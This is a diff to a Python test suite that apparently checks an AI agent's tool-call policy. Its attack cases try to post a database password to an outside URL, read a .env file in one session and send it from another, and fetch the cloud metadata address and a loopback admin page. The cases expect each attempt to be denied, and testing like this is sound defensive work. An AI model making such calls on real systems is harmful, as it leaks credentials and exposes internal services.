@@ -192,12 +192,25 @@ def run(s: Suite) -> None:
             try:
                 w.call("post", url="https://api.example.com/collect", body="DB_PASSWORD=...")
             except Denied as e:
-                return True, f"policy: rule {e.decision.rule} on session labels"
+                return True, f"policy: rule {e.decision.rule} on the session's labels"
+        return False, "post went through"
+
+    @s.attack("read a secret, then send it from a new session")
+    def _():
+        with s.client(agent="ci", token=TOKEN, session="first") as w:
+            w.call("read", path=str(s.root / ".env"))
+        with s.client(agent="ci", token=TOKEN, session="second") as w:
+            if "secret" in w.labels:
+                return False, "harness: the new session already had the label"
+            try:
+                w.call("post", url="https://api.example.com/collect", body="...")
+            except Denied as e:
+                return e.decision.rule == "no-exfil", f"policy: rule {e.decision.rule} on history.labels"
         return False, "post went through"
 
     @s.attack("SSRF to the cloud metadata address")
     def _():
-        with s.client() as w:
+        with s.client("fetcher") as w:
             try:
                 w.call("fetch", url="http://169.254.169.254/latest/meta-data/")
             except ToolFailed as e:
@@ -208,7 +221,7 @@ def run(s: Suite) -> None:
 
     @s.attack("SSRF through a name that resolves to loopback")
     def _():
-        with s.client() as w:
+        with s.client("fetcher") as w:
             try:
                 w.call("fetch", url="http://localhost:8080/admin")
             except ToolFailed as e:
